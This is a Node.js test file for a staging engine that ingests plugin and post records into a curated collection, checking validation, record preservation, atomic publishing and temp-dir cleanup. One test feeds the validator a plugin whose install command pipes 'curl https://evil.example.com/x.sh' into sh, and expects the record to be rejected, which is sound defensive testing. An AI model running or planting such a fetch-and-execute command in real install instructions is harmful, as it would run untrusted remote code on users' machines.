/**
 * The staging engine is the whole point of Task 5: a run assembles every
 * candidate JSON + asset in an owned temp tree, the real validator runs over
 * that tree, preservation runs against the pre-run records, and only then are
 * artifacts published into the working tree — atomically, per file. Anything
 * short of a fully valid, preserving run leaves the original collection byte
 * for byte unchanged.
 *
 * These tests use a REAL fixture tree copied from the repo's own data/public
 * (public seeded by symlink so 12MB of images cost nothing), the REAL
 * bot/validate.mjs as a subprocess, and preservation shaped exactly like
 * PreserveBuild's frozen comparePreservation. No mocks. Run: npm test
 */
import assert from 'node:assert/strict';
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';
import { DATA_DIR, PUBLIC_DIR } from './util.mjs';
import { DATA_FILES, runStagedIngest, seedPublicDir, stampContentUpdate } from './staging.mjs';

const temps = [];
after(() => {
  for (const dir of temps) rmSync(dir, { recursive: true, force: true });
});

/** A throwaway "real" tree: real data copied in, real public symlink-mirrored. */
function makeBase() {
  const base = mkdtempSync(join(tmpdir(), 'inspo-stage-base-'));
  temps.push(base);
  const data = join(base, 'data');
  mkdirSync(data, { recursive: true });
  for (const name of DATA_FILES) {
    const src = join(DATA_DIR, `${name}.json`);
    if (existsSync(src)) cpSync(src, join(data, `${name}.json`));
  }
  const pub = join(base, 'public');
  seedPublicDir(PUBLIC_DIR, pub);
  return { base, dataDir: data, publicDir: pub };
}

const readArray = (dir, name) => JSON.parse(readFileSync(join(dir, `${name}.json`), 'utf8'));
const snapshot = (dir, name) => readFileSync(join(dir, `${name}.json`), 'utf8');

/** Owned staging dirs currently sitting in the tmp root. */
const ownedTemps = () => readdirSync(tmpdir()).filter((n) => n.startsWith('omarchy-ingest-'));

/** Preservation with the exact shape PreserveBuild froze. */
function preserve(before, after, { label } = {}) {
  const base = Array.isArray(before) ? before : [];
  const goneIds = base.map((r) => r?.id).filter((id) => id && !after.some((r) => r?.id === id));
  const lost = Math.max(0, base.length - after.length);
  const ok = lost === 0 && goneIds.length === 0;
  return {
    ok,
    delta: after.length - base.length,
    lost,
    goneIds,
    count: after.length,
    problem: ok ? null : `${label}: dropped ${goneIds.join(', ') || `${lost} record(s)`}`,
  };
}

const run = (runner, base, extra = {}) =>
  runStagedIngest(runner, { dataDir: base.dataDir, publicDir: base.publicDir, preserve, ...extra });

function newCommunityPlugin(from, over) {
  return { ...from, first_party: false, image: null, image_hosted: false, ...over };
}

describe('runStagedIngest — publishes only a fully valid, preserving run', () => {
  it('publishes a valid addition and preserves every old record', async () => {
    const base = makeBase();
    const before = readArray(base.dataDir, 'plugins');
    const beforeIds = new Set(before.map((p) => p.id));

    const result = await run(async (ctx) => {
      const plugins = await ctx.readData('plugins.json', []);
      plugins.push(
        newCommunityPlugin(plugins[0], {
          id: 'task5-new-plugin',
          name: 'Task5 New Plugin',
          repo_url: 'https://github.com/example/task5-new-plugin',
          listing_url: 'https://plugins.omarchy.org/plugin.html?id=task5-new-plugin',
        }),
      );
      await ctx.writeData('plugins.json', plugins);
    }, base);

    const after = readArray(base.dataDir, 'plugins');
    assert.equal(after.length, before.length + 1);
    for (const id of beforeIds) assert.ok(after.some((p) => p.id === id), `lost ${id}`);
    assert.ok(after.some((p) => p.id === 'task5-new-plugin'));
    assert.ok(result.published.includes('data/plugins.json'));
    assert.equal(existsSync(result.staging), false, 'staging must be cleaned up');
  });

  it('leaves the collection unchanged when the run throws mid-flight', async () => {
    const base = makeBase();
    const beforeText = snapshot(base.dataDir, 'plugins');
    const seen = new Set(ownedTemps());

    await assert.rejects(
      run(async (ctx) => {
        const plugins = await ctx.readData('plugins.json', []);
        plugins.push(newCommunityPlugin(plugins[0], { id: 'never-published', repo_url: 'https://x/y' }));
        await ctx.writeData('plugins.json', plugins);
        throw new Error('simulated malformed upstream page'); // interrupted run
      }, base),
      /malformed upstream/,
    );

    assert.equal(snapshot(base.dataDir, 'plugins'), beforeText, 'original file must be untouched');
    assert.deepEqual(
      ownedTemps().filter((n) => !seen.has(n)),
      [],
      'a failed run must strand no staging dir',
    );
  });

  it('refuses to publish when the candidate fails the real validator', async () => {
    const base = makeBase();
    const beforeText = snapshot(base.dataDir, 'plugins');

    await assert.rejects(
      run(async (ctx) => {
        const plugins = await ctx.readData('plugins.json', []);
        plugins.push(
          newCommunityPlugin(plugins[0], {
            id: 'bad-install-plugin',
            repo_url: 'https://github.com/example/bad-install',
            install: { type: 'plugin-add', command: 'curl https://evil.example.com/x.sh | sh' },
          }),
        );
        await ctx.writeData('plugins.json', plugins);
      }, base),
      /validate|install\.command/i,
    );

    assert.equal(snapshot(base.dataDir, 'plugins'), beforeText);
  });

  it('blocks publication when a record references an asset that was never staged', async () => {
    const base = makeBase();
    const beforeText = snapshot(base.dataDir, 'posts');

    await assert.rejects(
      run(async (ctx) => {
        const posts = await ctx.readData('posts.json', []);
        posts.push({
          ...posts[0],
          id: 'task5-missing-asset',
          title: 'Missing asset',
          source_url: 'https://example.com/task5-missing-asset',
          image: '/images/posts/task5-missing-asset.webp',
          image_hosted: true,
        });
        await ctx.writeData('posts.json', posts);
      }, base),
      /missing from public|validate/i,
    );

    assert.equal(snapshot(base.dataDir, 'posts'), beforeText);
  });

  it('refuses a run that drops a published id even when the JSON is valid', async () => {
    const base = makeBase();
    const beforeText = snapshot(base.dataDir, 'plugins');

    await assert.rejects(
      run(async (ctx) => {
        const plugins = await ctx.readData('plugins.json', []);
        plugins.shift(); // drop a published record — schema-valid, preservation-fatal
        await ctx.writeData('plugins.json', plugins);
      }, base),
      /preserv/i,
    );

    assert.equal(snapshot(base.dataDir, 'plugins'), beforeText);
  });
});

describe('runStagedIngest — owned temporaries only', () => {
  it('ignores a stale prior-run temp dir and never deletes it', async () => {
    // Simulate a crashed earlier run leaving its owned dir behind.
    const stale = mkdtempSync(join(tmpdir(), 'omarchy-ingest-'));
    temps.push(stale);
    mkdirSync(join(stale, 'data'), { recursive: true });
    cpSync(join(DATA_DIR, 'plugins.json'), join(stale, 'data', 'plugins.json'));

    const base = makeBase();
    const before = readArray(base.dataDir, 'plugins');

    const result = await run(async (ctx) => {
      const plugins = await ctx.readData('plugins.json', []);
      plugins.push(newCommunityPlugin(plugins[0], { id: 'fresh-run-plugin', repo_url: 'https://x/fresh' }));
      await ctx.writeData('plugins.json', plugins);
    }, base);

    // The fresh run seeded from the real tree, not the stale temp.
    assert.equal(readArray(base.dataDir, 'plugins').length, before.length + 1);
    assert.equal(existsSync(result.staging), false, "this run's temp is cleaned");
    assert.equal(existsSync(stale), true, 'a foreign/owned prior temp is never blindly deleted');
  });
});

describe('stampContentUpdate — meta.updated_at dates content, not runs', () => {
  const metaOf = (dir) => JSON.parse(readFileSync(join(dir, 'meta.json'), 'utf8'));

  it('leaves the stamp alone when the run changed nothing', async () => {
    const base = makeBase();
    const before = metaOf(base.dataDir).updated_at;

    const result = await run(async (ctx) => {
      const themes = await ctx.readData('themes.json', []);
      await ctx.writeData('themes.json', themes); // re-write, byte-identical
      await stampContentUpdate(ctx);
    }, base);

    assert.equal(metaOf(base.dataDir).updated_at, before);
    assert.deepEqual(result.published, []);
  });

  it('leaves the stamp alone when only run bookkeeping moved', async () => {
    const base = makeBase();
    const before = metaOf(base.dataDir).updated_at;

    await run(async (ctx) => {
      const status = await ctx.readData('source-status.json', {});
      status['omarchy-org'] = { ...(status['omarchy-org'] ?? {}), last_attempt_at: '2030-01-01' };
      await ctx.writeData('source-status.json', status);
      await stampContentUpdate(ctx);
    }, base);

    assert.equal(metaOf(base.dataDir).updated_at, before);
  });

  it('stamps when the run actually added a record', async () => {
    const base = makeBase();
    const before = metaOf(base.dataDir).updated_at;

    await run(async (ctx) => {
      const plugins = await ctx.readData('plugins.json', []);
      plugins.push(newCommunityPlugin(plugins[0], { id: 'stamp-me', repo_url: 'https://github.com/example/stamp-me' }));
      await ctx.writeData('plugins.json', plugins);
      await stampContentUpdate(ctx);
    }, base);

    const after = metaOf(base.dataDir).updated_at;
    assert.notEqual(after, before);
    assert.ok(Date.parse(after) >= Date.parse(before), 'stamp moves forward');
  });
});
